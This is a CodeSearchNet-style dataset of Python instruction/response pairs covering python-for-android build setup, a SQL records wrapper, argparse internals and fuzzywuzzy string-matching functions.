{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncalculates all the storage and build dirs and makes sure the directories exist where necessary.", "response": "def setup_dirs(self, storage_dir):\n        '''Calculates all the storage and build dirs, and makes sure\n        the directories exist where necessary.'''\n        self.storage_dir = expanduser(storage_dir)\n        if ' ' in self.storage_dir:\n            raise ValueError('storage dir path cannot contain spaces, please '\n                             'specify a path with --storage-dir')\n        self.build_dir = join(self.storage_dir, 'build')\n        self.dist_dir = join(self.storage_dir, 'dists')"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nprepare the build environment for the Android SDK and the Android API.", "response": "def prepare_build_environment(self,\n                                  user_sdk_dir,\n                                  user_ndk_dir,\n                                  user_android_api,\n                                  user_ndk_api):\n        '''Checks that build dependencies exist and sets internal variables\n        for the Android SDK etc.\n\n        ..warning:: This *must* be called before trying any build stuff\n\n        '''\n\n        self.ensure_dirs()\n\n        if self._build_env_prepared:\n            return\n\n        ok = True\n\n        # Work out where the Android SDK is\n        sdk_dir = None\n        if user_sdk_dir:\n            sdk_dir = user_sdk_dir\n        # This is the old P4A-specific var\n        if sdk_dir is None:\n            sdk_dir = environ.get('ANDROIDSDK', None)\n        # This seems used more conventionally\n        if sdk_dir is None:\n            sdk_dir = environ.get('ANDROID_HOME', None)\n        # Checks in the buildozer SDK dir, useful for debug tests of p4a\n        if sdk_dir is None:\n            possible_dirs = glob.glob(expanduser(join(\n                '~', '.buildozer', 'android', 'platform', 'android-sdk-*')))\n            possible_dirs = [d for d in possible_dirs if not\n                             (d.endswith('.bz2') or d.endswith('.gz'))]\n            if possible_dirs:\n                info('Found possible SDK dirs in buildozer dir: {}'.format(\n                    ', '.join([d.split(os.sep)[-1] for d in possible_dirs])))\n                info('Will attempt to use SDK at {}'.format(possible_dirs[0]))\n                warning('This SDK lookup is intended for debug only, if you '\n                        'use python-for-android much you should probably '\n                        'maintain your own SDK download.')\n                sdk_dir = possible_dirs[0]\n        if sdk_dir is None:\n            raise BuildInterruptingException('Android SDK dir was not specified, exiting.')\n        self.sdk_dir = realpath(sdk_dir)\n\n        # Check what Android API we're using\n        android_api = None\n        if user_android_api:\n            android_api = user_android_api\n            info('Getting Android API version from user argument: {}'.format(android_api))\n        elif 'ANDROIDAPI' in environ:\n            android_api = environ['ANDROIDAPI']\n            info('Found Android API target in $ANDROIDAPI: {}'.format(android_api))\n        else:\n            info('Android API target was not set manually, using '\n                 'the default of {}'.format(RECOMMENDED_TARGET_API))\n            android_api = RECOMMENDED_TARGET_API\n        android_api = int(android_api)\n        self.android_api = android_api\n\n        check_target_api(android_api, self.archs[0].arch)\n\n        if exists(join(sdk_dir, 'tools', 'bin', 'avdmanager')):\n            avdmanager = sh.Command(join(sdk_dir, 'tools', 'bin', 'avdmanager'))\n            targets = avdmanager('list', 'target').stdout.decode('utf-8').split('\\n')\n        elif exists(join(sdk_dir, 'tools', 'android')):\n            android = sh.Command(join(sdk_dir, 'tools', 'android'))\n            targets = android('list').stdout.decode('utf-8').split('\\n')\n        else:\n            raise BuildInterruptingException(\n                'Could not find `android` or `sdkmanager` binaries in Android SDK',\n                instructions='Make sure the path to the Android SDK is correct')\n        apis = [s for s in targets if re.match(r'^ *API level: ', s)]\n        apis = [re.findall(r'[0-9]+', s) for s in apis]\n        apis = [int(s[0]) for s in apis if s]\n        info('Available Android APIs are ({})'.format(\n            ', '.join(map(str, apis))))\n        if android_api in apis:\n            info(('Requested API target {} is available, '\n                  'continuing.').format(android_api))\n        else:\n            raise BuildInterruptingException(\n                ('Requested API target {} is not available, install '\n                 'it with the SDK android tool.').format(android_api))\n\n        # Find the Android NDK\n        # Could also use ANDROID_NDK, but doesn't look like many tools use this\n        ndk_dir = None\n        if user_ndk_dir:\n            ndk_dir = user_ndk_dir\n            info('Getting NDK dir from from user argument')\n        if ndk_dir is None:  # The old P4A-specific dir\n            ndk_dir = environ.get('ANDROIDNDK', None)\n            if ndk_dir is not None:\n                info('Found NDK dir in $ANDROIDNDK: {}'.format(ndk_dir))\n        if ndk_dir is None:  # Apparently the most common convention\n            ndk_dir = environ.get('NDK_HOME', None)\n            if ndk_dir is not None:\n                info('Found NDK dir in $NDK_HOME: {}'.format(ndk_dir))\n        if ndk_dir is None:  # Another convention (with maven?)\n            ndk_dir = environ.get('ANDROID_NDK_HOME', None)\n            if ndk_dir is not None:\n                info('Found NDK dir in $ANDROID_NDK_HOME: {}'.format(ndk_dir))\n        if ndk_dir is None:  # Checks in the buildozer NDK dir, useful\n            #                # for debug tests of p4a\n            possible_dirs = glob.glob(expanduser(join(\n                '~', '.buildozer', 'android', 'platform', 'android-ndk-r*')))\n            if possible_dirs:\n                info('Found possible NDK dirs in buildozer dir: {}'.format(\n                    ', '.join([d.split(os.sep)[-1] for d in possible_dirs])))\n                info('Will attempt to use NDK at {}'.format(possible_dirs[0]))\n                warning('This NDK lookup is intended for debug only, if you '\n                        'use python-for-android much you should probably '\n                        'maintain your own NDK download.')\n                ndk_dir = possible_dirs[0]\n        if ndk_dir is None:\n            raise BuildInterruptingException('Android NDK dir was not specified')\n        self.ndk_dir = realpath(ndk_dir)\n\n        check_ndk_version(ndk_dir)\n\n        ndk_api = None\n        if user_ndk_api:\n            ndk_api = user_ndk_api\n            info('Getting NDK API version (i.e. minimum supported API) from user argument')\n        elif 'NDKAPI' in environ:\n            ndk_api = environ.get('NDKAPI', None)\n            info('Found Android API target in $NDKAPI')\n        else:\n            ndk_api = min(self.android_api, RECOMMENDED_NDK_API)\n            warning('NDK API target was not set manually, using '\n                    'the default of {} = min(android-api={}, default ndk-api={})'.format(\n                        ndk_api, self.android_api, RECOMMENDED_NDK_API))\n        ndk_api = int(ndk_api)\n        self.ndk_api = ndk_api\n\n        check_ndk_api(ndk_api, self.android_api)\n\n        virtualenv = get_virtualenv_executable()\n        if virtualenv is None:\n            raise IOError('Couldn\\'t find a virtualenv executable, '\n                          'you must install this to use p4a.')\n        self.virtualenv = virtualenv\n        info('Found virtualenv at {}'.format(virtualenv))\n\n        # path to some tools\n        self.ccache = sh.which(\"ccache\")\n        if not self.ccache:\n            info('ccache is missing, the build will not be optimized in the '\n                 'future.')\n        for cython_fn in (\"cython\", \"cython3\", \"cython2\", \"cython-2.7\"):\n            cython = sh.which(cython_fn)\n            if cython:\n                self.cython = cython\n                break\n        else:\n            raise BuildInterruptingException('No cython binary found.')\n        if not self.cython:\n            ok = False\n            warning(\"Missing requirement: cython is not installed\")\n\n        # This would need to be changed if supporting multiarch APKs\n        arch = self.archs[0]\n        platform_dir = arch.platform_dir\n        toolchain_prefix = arch.toolchain_prefix\n        toolchain_version = None\n        self.ndk_platform = join(\n            self.ndk_dir,\n            'platforms',\n            'android-{}'.format(self.ndk_api),\n            platform_dir)\n        if not exists(self.ndk_platform):\n            warning('ndk_platform doesn\\'t exist: {}'.format(\n                self.ndk_platform))\n            ok = False\n\n        py_platform = sys.platform\n        if py_platform in ['linux2', 'linux3']:\n            py_platform = 'linux'\n\n        toolchain_versions = []\n        toolchain_path = join(self.ndk_dir, 'toolchains')\n        if isdir(toolchain_path):\n            toolchain_contents = glob.glob('{}/{}-*'.format(toolchain_path,\n                                                            toolchain_prefix))\n            toolchain_versions = [split(path)[-1][len(toolchain_prefix) + 1:]\n                                  for path in toolchain_contents]\n        else:\n            warning('Could not find toolchain subdirectory!')\n            ok = False\n        toolchain_versions.sort()\n\n        toolchain_versions_gcc = []\n        for toolchain_version in toolchain_versions:\n            if toolchain_version[0].isdigit():\n                # GCC toolchains begin with a number\n                toolchain_versions_gcc.append(toolchain_version)\n\n        if toolchain_versions:\n            info('Found the following toolchain versions: {}'.format(\n                toolchain_versions))\n            info('Picking the latest gcc toolchain, here {}'.format(\n                toolchain_versions_gcc[-1]))\n            toolchain_version = toolchain_versions_gcc[-1]\n        else:\n            warning('Could not find any toolchain for {}!'.format(\n                toolchain_prefix))\n            ok = False\n\n        self.toolchain_prefix = toolchain_prefix\n        self.toolchain_version = toolchain_version\n        # Modify the path so that sh finds modules appropriately\n        environ['PATH'] = (\n            '{ndk_dir}/toolchains/{toolchain_prefix}-{toolchain_version}/'\n            'prebuilt/{py_platform}-x86/bin/:{ndk_dir}/toolchains/'\n            '{toolchain_prefix}-{toolchain_version}/prebuilt/'\n            '{py_platform}-x86_64/bin/:{ndk_dir}:{sdk_dir}/'\n            'tools:{path}').format(\n                sdk_dir=self.sdk_dir, ndk_dir=self.ndk_dir,\n                toolchain_prefix=toolchain_prefix,\n                toolchain_version=toolchain_version,\n                py_platform=py_platform, path=environ.get('PATH'))\n\n        for executable in (\"pkg-config\", \"autoconf\", \"automake\", \"libtoolize\",\n                           \"tar\", \"bzip2\", \"unzip\", \"make\", \"gcc\", \"g++\"):\n            if not sh.which(executable):\n                warning(\"Missing executable: {} is not installed\".format(\n                    executable))\n\n        if not ok:\n            raise BuildInterruptingException(\n                'python-for-android cannot continue due to the missing executables above')"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn the location of site - packages in the python - install build dir.", "response": "def get_site_packages_dir(self, arch=None):\n        '''Returns the location of site-packages in the python-install build\n        dir.\n        '''\n        if self.python_recipe.name == 'python2legacy':\n            return join(self.get_python_install_dir(),\n                        'lib', 'python2.7', 'site-packages')\n        return self.get_python_install_dir()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_libs_dir(self, arch):\n        '''The libs dir for a given arch.'''\n        ensure_dir(join(self.libs_dir, arch))\n        return join(self.libs_dir, arch)", "response": "The libs dir for a given arch."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nmakes limited length string in form : the string is very lo... and 15 more", "response": "def shorten_string(string, max_width):\n    ''' make limited length string in form:\n      \"the string is very lo...(and 15 more)\"\n    '''\n    string_len = len(string)\n    if string_len <= max_width:\n        return string\n    visible = max_width - 16 - int(log10(string_len))\n    # expected suffix len \"...(and XXXXX more)\"\n    if not isinstance(string, unistr):\n        visstring = unistr(string[:visible], errors='ignore')\n    else:\n        visstring = string[:visible]\n    return u''.join((visstring, u'...(and ',\n                     unistr(string_len - visible), u' more)'))"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nrun the command while Formula logging the output.", "response": "def shprint(command, *args, **kwargs):\n    '''Runs the command (which should be an sh.Command instance), while\n    logging the output.'''\n    kwargs[\"_iter\"] = True\n    kwargs[\"_out_bufsize\"] = 1\n    kwargs[\"_err_to_out\"] = True\n    kwargs[\"_bg\"] = True\n    is_critical = kwargs.pop('_critical', False)\n    tail_n = kwargs.pop('_tail', None)\n    full_debug = False\n    if \"P4A_FULL_DEBUG\" in os.environ:\n        tail_n = 0\n        full_debug = True\n    filter_in = kwargs.pop('_filter', None)\n    filter_out = kwargs.pop('_filterout', None)\n    if len(logger.handlers) > 1:\n        logger.removeHandler(logger.handlers[1])\n    columns = get_console_width()\n    command_path = str(command).split('/')\n    command_string = command_path[-1]\n    string = ' '.join(['{}->{} running'.format(Out_Fore.LIGHTBLACK_EX,\n                                               Out_Style.RESET_ALL),\n                       command_string] + list(args))\n\n    # If logging is not in DEBUG mode, trim the command if necessary\n    if logger.level > logging.DEBUG:\n        logger.info('{}{}'.format(shorten_string(string, columns - 12),\n                                  Err_Style.RESET_ALL))\n    else:\n        logger.debug('{}{}'.format(string, Err_Style.RESET_ALL))\n\n    need_closing_newline = False\n    try:\n        msg_hdr = '           working: '\n        msg_width = columns - len(msg_hdr) - 1\n        output = command(*args, **kwargs)\n        for line in output:\n            if isinstance(line, bytes):\n                line = line.decode('utf-8', errors='replace')\n            if logger.level > logging.DEBUG:\n                if full_debug:\n                    stdout.write(line)\n                    stdout.flush()\n                    continue\n                msg = line.replace(\n                    '\\n', ' ').replace(\n                        '\\t', ' ').replace(\n                            '\\b', ' ').rstrip()\n                if msg:\n                    if \"CI\" not in os.environ:\n                        stdout.write(u'{}\\r{}{:<{width}}'.format(\n                            Err_Style.RESET_ALL, msg_hdr,\n                            shorten_string(msg, msg_width), width=msg_width))\n                        stdout.flush()\n                        need_closing_newline = True\n            else:\n                logger.debug(''.join(['\\t', line.rstrip()]))\n        if need_closing_newline:\n            stdout.write('{}\\r{:>{width}}\\r'.format(\n                Err_Style.RESET_ALL, ' ', width=(columns - 1)))\n            stdout.flush()\n    except sh.ErrorReturnCode as err:\n        if need_closing_newline:\n            stdout.write('{}\\r{:>{width}}\\r'.format(\n                Err_Style.RESET_ALL, ' ', width=(columns - 1)))\n            stdout.flush()\n        if tail_n is not None or filter_in or filter_out:\n            def printtail(out, name, forecolor, tail_n=0,\n                          re_filter_in=None, re_filter_out=None):\n                lines = out.splitlines()\n                if re_filter_in is not None:\n                    lines = [l for l in lines if re_filter_in.search(l)]\n                if re_filter_out is not None:\n                    lines = [l for l in lines if not re_filter_out.search(l)]\n                if tail_n == 0 or len(lines) <= tail_n:\n                    info('{}:\\n{}\\t{}{}'.format(\n                        name, forecolor, '\\t\\n'.join(lines), Out_Fore.RESET))\n                else:\n                    info('{} (last {} lines of {}):\\n{}\\t{}{}'.format(\n                        name, tail_n, len(lines),\n                        forecolor, '\\t\\n'.join([s for s in lines[-tail_n:]]),\n                        Out_Fore.RESET))\n            printtail(err.stdout.decode('utf-8'), 'STDOUT', Out_Fore.YELLOW, tail_n,\n                      re.compile(filter_in) if filter_in else None,\n                      re.compile(filter_out) if filter_out else None)\n            printtail(err.stderr.decode('utf-8'), 'STDERR', Err_Fore.RED)\n        if is_critical:\n            env = kwargs.get(\"env\")\n            if env is not None:\n                info(\"{}ENV:{}\\n{}\\n\".format(\n                    Err_Fore.YELLOW, Err_Fore.RESET, \"\\n\".join(\n                        \"set {}={}\".format(n, v) for n, v in env.items())))\n            info(\"{}COMMAND:{}\\ncd {} && {} {}\\n\".format(\n                Err_Fore.YELLOW, Err_Fore.RESET, os.getcwd(), command,\n                ' '.join(args)))\n            warning(\"{}ERROR: {} failed!{}\".format(\n                Err_Fore.RED, command, Err_Fore.RESET))\n            exit(1)\n        else:\n            raise\n\n    return output"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nadd an argument to the icalEntry object", "response": "def add_argument(self, *args, **kwargs):\r\n        \"\"\"\r\n        add_argument(dest, ..., name=value, ...)\r\n        add_argument(option_string, option_string, ..., name=value, ...)\r\n        \"\"\"\r\n\r\n        # if no positional args are supplied or only one is supplied and\r\n        # it doesn't look like an option string, parse a positional\r\n        # argument\r\n        chars = self.prefix_chars\r\n        if not args or len(args) == 1 and args[0][0] not in chars:\r\n            if args and 'dest' in kwargs:\r\n                raise ValueError('dest supplied twice for positional argument')\r\n            kwargs = self._get_positional_kwargs(*args, **kwargs)\r\n\r\n        # otherwise, we're adding an optional argument\r\n        else:\r\n            kwargs = self._get_optional_kwargs(*args, **kwargs)\r\n\r\n        # if no default was supplied, use the parser-level default\r\n        if 'default' not in kwargs:\r\n            dest = kwargs['dest']\r\n            if dest in self._defaults:\r\n                kwargs['default'] = self._defaults[dest]\r\n            elif self.argument_default is not None:\r\n                kwargs['default'] = self.argument_default\r\n\r\n        # create the action object, and add it to the parser\r\n        action_class = self._pop_action_class(kwargs)\r\n        if not _callable(action_class):\r\n            raise ValueError('unknown action \"%s\"' % action_class)\r\n        action = action_class(**kwargs)\r\n\r\n        # raise an error if the action type is not callable\r\n        type_func = self._registry_get('type', action.type, action.type)\r\n        if not _callable(type_func):\r\n            raise ValueError('%r is not callable' % type_func)\r\n\r\n        return self._add_action(action)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef error(self, message):\r\n        self.print_usage(_sys.stderr)\r\n        self.exit(2, _('%s: error: %s\\n') % (self.prog, message))", "response": "Print an error message and exit."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngiving an object return a boolean indicating whether it is an instance or subclass of Exception.", "response": "def isexception(obj):\n    \"\"\"Given an object, return a boolean indicating whether it is an instance\n    or subclass of :py:class:`Exception`.\n    \"\"\"\n    if isinstance(obj, Exception):\n        return True\n    if isclass(obj) and issubclass(obj, Exception):\n        return True\n    return False"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _reduce_datetimes(row):\n\n    row = list(row)\n\n    for i in range(len(row)):\n        if hasattr(row[i], 'isoformat'):\n            row[i] = row[i].isoformat()\n    return tuple(row)", "response": "Receives a row converts datetimes to strings."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef as_dict(self, ordered=False):\n        items = zip(self.keys(), self.values())\n\n        return OrderedDict(items) if ordered else dict(items)", "response": "Returns the row as a dictionary as ordered."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef all(self, as_dict=False, as_ordereddict=False):\n\n        # By calling list it calls the __iter__ method\n        rows = list(self)\n\n        if as_dict:\n            return [r.as_dict() for r in rows]\n        elif as_ordereddict:\n            return [r.as_dict(ordered=True) for r in rows]\n\n        return rows", "response": "Returns a list of all rows for the RecordCollection."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a single record for the RecordCollection ensuring that it is the only record. If default is an instance of Exception then raise it instead of returning it.", "response": "def one(self, default=None, as_dict=False, as_ordereddict=False):\n        \"\"\"Returns a single record for the RecordCollection, ensuring that it\n        is the only record, or returns `default`. If `default` is an instance\n        or subclass of Exception, then raise it instead of returning it.\"\"\"\n\n        # Ensure that we don't have more than one row.\n        try:\n            self[1]\n        except IndexError:\n            return self.first(default=default, as_dict=as_dict, as_ordereddict=as_ordereddict)\n        else:\n            raise ValueError('RecordCollection contained more than one row. '\n                             'Expects only one row when using '\n                             'RecordCollection.one')"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngetting a connection to this Database.", "response": "def get_connection(self):\n        \"\"\"Get a connection to this Database. Connections are retrieved from a\n        pool.\n        \"\"\"\n        if not self.open:\n            raise exc.ResourceClosedError('Database closed.')\n\n        return Connection(self._engine.connect())"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef query(self, query, fetchall=False, **params):\n        with self.get_connection() as conn:\n            return conn.query(query, fetchall, **params)", "response": "Executes a SQL query against the Database. Returns a RecordCollection object."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef bulk_query(self, query, *multiparams):\n\n        with self.get_connection() as conn:\n            conn.bulk_query(query, *multiparams)", "response": "Bulk insert or update."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef query_file(self, path, fetchall=False, **params):\n\n        with self.get_connection() as conn:\n            return conn.query_file(path, fetchall, **params)", "response": "Like Database. query but takes a filename to load a query from."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nlike Database. bulk_query but takes a filename to load a query from.", "response": "def bulk_query_file(self, path, *multiparams):\n        \"\"\"Like Database.bulk_query, but takes a filename to load a query from.\"\"\"\n\n        with self.get_connection() as conn:\n            conn.bulk_query_file(path, *multiparams)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef query(self, query, fetchall=False, **params):\n\n        # Execute the given query.\n        cursor = self._conn.execute(text(query), **params) # TODO: PARAMS GO HERE\n\n        # Row-by-row Record generator.\n        row_gen = (Record(cursor.keys(), row) for row in cursor)\n\n        # Convert psycopg2 results to RecordCollection.\n        results = RecordCollection(row_gen)\n\n        # Fetch all results if desired.\n        if fetchall:\n            results.all()\n\n        return results", "response": "Executes a given SQL query against the connected Database. Returns a RecordCollection which can be iterated over to get result rows as dictionaries."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef bulk_query(self, query, *multiparams):\n\n        self._conn.execute(text(query), *multiparams)", "response": "Bulk insert or update."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nlikes Connection. query but takes a filename to load a query from.", "response": "def query_file(self, path, fetchall=False, **params):\n        \"\"\"Like Connection.query, but takes a filename to load a query from.\"\"\"\n\n        # If path doesn't exists\n        if not os.path.exists(path):\n            raise IOError(\"File '{}' not found!\".format(path))\n\n        # If it's a directory\n        if os.path.isdir(path):\n            raise IOError(\"'{}' is a directory!\".format(path))\n\n        # Read the given .sql file into memory.\n        with open(path) as f:\n            query = f.read()\n\n        # Defer processing to self.query method.\n        return self.query(query=query, fetchall=fetchall, **params)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef bulk_query_file(self, path, *multiparams):\n\n         # If path doesn't exists\n        if not os.path.exists(path):\n            raise IOError(\"File '{}'' not found!\".format(path))\n\n        # If it's a directory\n        if os.path.isdir(path):\n            raise IOError(\"'{}' is a directory!\".format(path))\n\n        # Read the given .sql file into memory.\n        with open(path) as f:\n            query = f.read()\n\n        self._conn.execute(text(query), *multiparams)", "response": "Like Connection. bulk_query but takes a filename to load a query\n         from."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nselects the best match in a list or dictionary of choices. Find best matches in a list or dictionary of choices, return a generator of tuples containing the match and its score. If a dictionary is used, also returns the key for each match. Arguments: query: An object representing the thing we want to find. choices: An iterable or dictionary-like object containing choices to be matched against the query. Dictionary arguments of {key: value} pairs will attempt to match the query against each value. processor: Optional function of the form f(a) -> b, where a is the query or individual choice and b is the choice to be used in matching. This can be used to match against, say, the first element of a list: lambda x: x[0] Defaults to fuzzywuzzy.utils.full_process(). scorer: Optional function for scoring matches between the query and an individual processed choice. This should be a function of the form f(query, choice) -> int. By default, fuzz.WRatio() is used and expects both query and choice to be strings. score_cutoff: Optional argument for score threshold. No matches with a score less than this number will be returned. Defaults to 0. Returns: Generator of tuples containing the match and its score. If a list is used for choices, then the result will be 2-tuples. If a dictionary is used, then the result will be 3-tuples containing the key for each match. For example, searching for 'bird' in the dictionary {'bard': 'train', 'dog': 'man'} may return ('train', 22, 'bard'), ('man', 0, 'dog')", "response": "def extractWithoutOrder(query, choices, processor=default_processor, scorer=default_scorer, score_cutoff=0):\n    \"\"\"Select the best match in a list or dictionary of choices.\n\n    Find best matches in a list or dictionary of choices, return a\n    generator of tuples containing the match and its score. If a dictionary\n    is used, also returns the key for each match.\n\n    Arguments:\n        query: An object representing the thing we want to find.\n        choices: An iterable or dictionary-like object containing choices\n            to be matched against the query. Dictionary arguments of\n            {key: value} pairs will attempt to match the query against\n            each value.\n        processor: Optional function of the form f(a) -> b, where a is the query or\n            individual choice and b is the choice to be used in matching.\n\n            This can be used to match against, say, the first element of\n            a list:\n\n            lambda x: x[0]\n\n            Defaults to fuzzywuzzy.utils.full_process().\n        scorer: Optional function for scoring matches between the query and\n            an individual processed choice. This should be a function\n            of the form f(query, choice) -> int.\n\n            By default, fuzz.WRatio() is used and expects both query and\n            choice to be strings.\n        score_cutoff: Optional argument for score threshold. No matches with\n            a score less than this number will be returned. Defaults to 0.\n\n    Returns:\n        Generator of tuples containing the match and its score.\n\n        If a list is used for choices, then the result will be 2-tuples.\n        If a dictionary is used, then the result will be 3-tuples containing\n        the key for each match.\n\n        For example, searching for 'bird' in the dictionary\n\n        {'bard': 'train', 'dog': 'man'}\n\n        may return\n\n        ('train', 22, 'bard'), ('man', 0, 'dog')\n    \"\"\"\n    # Catch generators without lengths\n    def no_process(x):\n        return x\n\n    try:\n        if choices is None or len(choices) == 0:\n            raise StopIteration\n    except TypeError:\n        pass\n\n    # If the processor was removed by setting it to None\n    # perfom a noop as it still needs to be a function\n    if processor is None:\n        processor = no_process\n\n    # Run the processor on the input query.\n    processed_query = processor(query)\n\n    if len(processed_query) == 0:\n        logging.warning(u\"Applied processor reduces input query to empty string, \"\n                        \"all comparisons will have score 0. \"\n                        \"[Query: \\'{0}\\']\".format(query))\n\n    # Don't run full_process twice\n    if scorer in [fuzz.WRatio, fuzz.QRatio,\n                  fuzz.token_set_ratio, fuzz.token_sort_ratio,\n                  fuzz.partial_token_set_ratio, fuzz.partial_token_sort_ratio,\n                  fuzz.UWRatio, fuzz.UQRatio] \\\n            and processor == utils.full_process:\n        processor = no_process\n\n    # Only process the query once instead of for every choice\n    if scorer in [fuzz.UWRatio, fuzz.UQRatio]:\n        pre_processor = partial(utils.full_process, force_ascii=False)\n        scorer = partial(scorer, full_process=False)\n    elif scorer in [fuzz.WRatio, fuzz.QRatio,\n                    fuzz.token_set_ratio, fuzz.token_sort_ratio,\n                    fuzz.partial_token_set_ratio, fuzz.partial_token_sort_ratio]:\n        pre_processor = partial(utils.full_process, force_ascii=True)\n        scorer = partial(scorer, full_process=False)\n    else:\n        pre_processor = no_process\n    processed_query = pre_processor(processed_query)\n\n    try:\n        # See if choices is a dictionary-like object.\n        for key, choice in choices.items():\n            processed = pre_processor(processor(choice))\n            score = scorer(processed_query, processed)\n            if score >= score_cutoff:\n                yield (choice, score, key)\n    except AttributeError:\n        # It's a list; just iterate over it.\n        for choice in choices:\n            processed = pre_processor(processor(choice))\n            score = scorer(processed_query, processed)\n            if score >= score_cutoff:\n                yield (choice, score)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nselect the best match in a list or dictionary of choices and return the key for each match.", "response": "def extract(query, choices, processor=default_processor, scorer=default_scorer, limit=5):\n    \"\"\"Select the best match in a list or dictionary of choices.\n\n    Find best matches in a list or dictionary of choices, return a\n    list of tuples containing the match and its score. If a dictionary\n    is used, also returns the key for each match.\n\n    Arguments:\n        query: An object representing the thing we want to find.\n        choices: An iterable or dictionary-like object containing choices\n            to be matched against the query. Dictionary arguments of\n            {key: value} pairs will attempt to match the query against\n            each value.\n        processor: Optional function of the form f(a) -> b, where a is the query or\n            individual choice and b is the choice to be used in matching.\n\n            This can be used to match against, say, the first element of\n            a list:\n\n            lambda x: x[0]\n\n            Defaults to fuzzywuzzy.utils.full_process().\n        scorer: Optional function for scoring matches between the query and\n            an individual processed choice. This should be a function\n            of the form f(query, choice) -> int.\n            By default, fuzz.WRatio() is used and expects both query and\n            choice to be strings.\n        limit: Optional maximum for the number of elements returned. Defaults\n            to 5.\n\n    Returns:\n        List of tuples containing the match and its score.\n\n        If a list is used for choices, then the result will be 2-tuples.\n        If a dictionary is used, then the result will be 3-tuples containing\n        the key for each match.\n\n        For example, searching for 'bird' in the dictionary\n\n        {'bard': 'train', 'dog': 'man'}\n\n        may return\n\n        [('train', 22, 'bard'), ('man', 0, 'dog')]\n    \"\"\"\n    sl = extractWithoutOrder(query, choices, processor, scorer)\n    return heapq.nlargest(limit, sl, key=lambda i: i[1]) if limit is not None else \\\n        sorted(sl, key=lambda i: i[1], reverse=True)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nextracts the best matches to a collection of choices.", "response": "def extractBests(query, choices, processor=default_processor, scorer=default_scorer, score_cutoff=0, limit=5):\n    \"\"\"Get a list of the best matches to a collection of choices.\n\n    Convenience function for getting the choices with best scores.\n\n    Args:\n        query: A string to match against\n        choices: A list or dictionary of choices, suitable for use with\n            extract().\n        processor: Optional function for transforming choices before matching.\n            See extract().\n        scorer: Scoring function for extract().\n        score_cutoff: Optional argument for score threshold. No matches with\n            a score less than this number will be returned. Defaults to 0.\n        limit: Optional maximum for the number of elements returned. Defaults\n            to 5.\n\n    Returns: A a list of (match, score) tuples.\n    \"\"\"\n\n    best_list = extractWithoutOrder(query, choices, processor, scorer, score_cutoff)\n    return heapq.nlargest(limit, best_list, key=lambda i: i[1]) if limit is not None else \\\n        sorted(best_list, key=lambda i: i[1], reverse=True)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngiving a query string and a list of choices returns the single best match and its score.", "response": "def extractOne(query, choices, processor=default_processor, scorer=default_scorer, score_cutoff=0):\n    \"\"\"Find the single best match above a score in a list of choices.\n\n    This is a convenience method which returns the single best choice.\n    See extract() for the full arguments list.\n\n    Args:\n        query: A string to match against\n        choices: A list or dictionary of choices, suitable for use with\n            extract().\n        processor: Optional function for transforming choices before matching.\n            See extract().\n        scorer: Scoring function for extract().\n        score_cutoff: Optional argument for score threshold. If the best\n            match is found, but it is not greater than this number, then\n            return None anyway (\"not a good enough match\").  Defaults to 0.\n\n    Returns:\n        A tuple containing a single match and its score, if a match\n        was found that was above score_cutoff. Otherwise, returns None.\n    \"\"\"\n    best_list = extractWithoutOrder(query, choices, processor, scorer, score_cutoff)\n    try:\n        return max(best_list, key=lambda i: i[1])\n    except ValueError:\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef dedupe(contains_dupes, threshold=70, scorer=fuzz.token_set_ratio):\n\n    extractor = []\n\n    # iterate over items in *contains_dupes*\n    for item in contains_dupes:\n        # return all duplicate matches found\n        matches = extract(item, contains_dupes, limit=None, scorer=scorer)\n        # filter matches based on the threshold\n        filtered = [x for x in matches if x[1] > threshold]\n        # if there is only 1 item in *filtered*, no duplicates were found so append to *extracted*\n        if len(filtered) == 1:\n            extractor.append(filtered[0][0])\n\n        else:\n            # alpha sort\n            filtered = sorted(filtered, key=lambda x: x[0])\n            # length sort\n            filter_sort = sorted(filtered, key=lambda x: len(x[0]), reverse=True)\n            # take first item as our 'canonical example'\n            extractor.append(filter_sort[0][0])\n\n    # uniquify *extractor* list\n    keys = {}\n    for e in extractor:\n        keys[e] = 1\n    extractor = keys.keys()\n\n    # check that extractor differs from contain_dupes (e.g. duplicates were found)\n    # if not, then return the original list\n    if len(extractor) == len(contains_dupes):\n        return contains_dupes\n    else:\n        return extractor", "response": "This function dedupes the duplicate list of the items in contains_dupes and returns a list of the items that are not in the duplicate list."}
